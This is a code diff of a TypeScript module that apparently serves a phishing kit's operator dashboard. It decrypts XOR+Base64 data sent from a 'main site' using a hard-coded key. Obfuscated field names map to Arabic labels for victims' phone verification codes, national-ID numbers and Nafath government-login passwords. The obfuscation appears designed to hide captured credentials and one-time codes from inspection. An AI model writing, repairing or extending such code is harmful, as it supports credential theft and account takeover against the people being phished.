@@ -1,38 +1,30 @@
 // Decryption utilities for admin dashboard
 // Automatically decrypts XOR+Base64 encrypted text from main site
 
-const XOR_KEY = "BeCare2024SecureKey!@#"
+const XOR_KEY = "BeCare2024SecureKey!@#";
 
 /**
  * Decrypt XOR+Base64 encrypted text
  */
-function btoaToUnicode(str: string): string {
-  return decodeURIComponent(Array.from(atob(str), c =>
-    '%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2)
-  ).join(''))
-}
-
 export function decryptText(encrypted: string): string {
-  if (!encrypted) return encrypted
+  if (!encrypted) return encrypted;
 
   try {
-    const decoded = btoaToUnicode(encrypted)
-    let decrypted = ""
+    // Decode Base64
+    const decoded = atob(encrypted);
+
+    // XOR decrypt
+    let decrypted = "";
     for (let i = 0; i < decoded.length; i++) {
-      decrypted += String.fromCharCode(decoded.charCodeAt(i) ^ XOR_KEY.charCodeAt(i % XOR_KEY.length))
+      const charCode =
+        decoded.charCodeAt(i) ^ XOR_KEY.charCodeAt(i % XOR_KEY.length);
+      decrypted += String.fromCharCode(charCode);
     }
-    return decrypted
-  } catch {
-    try {
-      const decoded = atob(encrypted)
-      let decrypted = ""
-      for (let i = 0; i < decoded.length; i++) {
-        decrypted += String.fromCharCode(decoded.charCodeAt(i) ^ XOR_KEY.charCodeAt(i % XOR_KEY.length))
-      }
-      return decrypted
-    } catch {
-      return encrypted
-    }
+
+    return decrypted;
+  } catch (error) {
+    // If decryption fails, return original (might not be encrypted)
+    return encrypted;
   }
 }
 
@@ -41,21 +33,21 @@ export function decryptText(encrypted: string): string {
  * Checks if a string looks like Base64 and attempts decryption
  */
 export function autoDecryptObject<T extends Record<string, any>>(obj: T): T {
-  if (!obj || typeof obj !== 'object') return obj
-  
-  const decrypted = { ...obj }
-  
+  if (!obj || typeof obj !== "object") return obj;
+
+  const decrypted = { ...obj };
+
   for (const key in decrypted) {
-    const value = decrypted[key]
-    
-    if (typeof value === 'string' && isLikelyEncrypted(value)) {
-      decrypted[key] = decryptText(value) as any
-    } else if (typeof value === 'object' && value !== null) {
-      decrypted[key] = autoDecryptObject(value)
+    const value = decrypted[key];
+
+    if (typeof value === "string" && isLikelyEncrypted(value)) {
+      decrypted[key] = decryptText(value) as any;
+    } else if (typeof value === "object" && value !== null) {
+      decrypted[key] = autoDecryptObject(value);
     }
   }
-  
-  return decrypted
+
+  return decrypted;
 }
 
 /**
@@ -64,8 +56,8 @@ export function autoDecryptObject<T extends Record<string, any>>(obj: T): T {
 function isLikelyEncrypted(str: string): boolean {
   // Base64 pattern: only contains A-Z, a-z, 0-9, +, /, =
   // And typically longer than 20 chars for encrypted Arabic text
-  const base64Pattern = /^[A-Za-z0-9+/]+=*$/
-  return str.length > 20 && base64Pattern.test(str)
+  const base64Pattern = /^[A-Za-z0-9+/]+=*$/;
+  return str.length > 20 && base64Pattern.test(str);
 }
 
 /**
@@ -82,7 +74,7 @@ export const FIELD_LABELS: Record<string, string> = {
   _v7: "كود تحقق الهاتف",
   _v8: "رقم الهوية (نفاذ)",
   _v9: "كلمة المرور (نفاذ)",
-}
+};
 
 /**
  * Entry type mapping: obfuscated → readable
@@ -94,18 +86,18 @@ export const ENTRY_TYPE_LABELS: Record<string, string> = {
   _t4: "phone_info",
   _t5: "phone_otp",
   _t6: "nafad",
-}
+};
 
 /**
  * Get readable label for obfuscated field name
  */
 export function getFieldLabel(fieldName: string): string {
-  return FIELD_LABELS[fieldName] || fieldName
+  return FIELD_LABELS[fieldName] || fieldName;
 }
 
 /**
  * Get readable entry type from obfuscated type
  */
 export function getEntryType(obfuscatedType: string): string {
-  return ENTRY_TYPE_LABELS[obfuscatedType] || obfuscatedType
+  return ENTRY_TYPE_LABELS[obfuscatedType] || obfuscatedType;
 }
